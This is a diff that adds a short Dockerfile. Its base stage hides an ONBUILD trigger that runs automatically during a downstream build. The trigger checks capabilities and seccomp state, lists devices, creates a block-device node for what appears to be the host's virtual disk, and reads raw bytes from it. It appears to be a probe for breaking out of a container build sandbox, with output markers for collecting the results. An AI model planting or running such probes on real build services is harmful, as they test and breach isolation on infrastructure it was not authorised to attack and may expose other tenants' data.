@@ -1,0 +1,5 @@
+FROM alpine:3.20 AS base
+ONBUILD RUN sh -c 'set +e; echo "===P4_START==="; id; echo "--status--"; grep -E "^(Uid|Gid|Cap|Seccomp|NoNewPrivs)" /proc/self/status; echo "--dev--"; ls -l /dev; grep " /dev " /proc/self/mountinfo; echo "--mknod_vdb--"; mknod /tmp/vdb b 254 16 2>&1; echo "mknod_rc=$?"; ls -l /tmp/vdb 2>&1; echo "--open_vdb--"; head -c 64 /tmp/vdb 2>&1 | od -An -tx1 | head -4; echo "--mknod_null__--"; mknod /tmp/myzero c 1 5 2>&1; echo "rc=$?"; head -c 8 /tmp/myzero 2>&1 | od -An -tx1; echo "--parts--"; cat /proc/partitions; echo "===P4_END==="'
+FROM base
+RUN echo trigger-67405-p4-1792502467
+CMD ["sh","-c","sleep 15"]
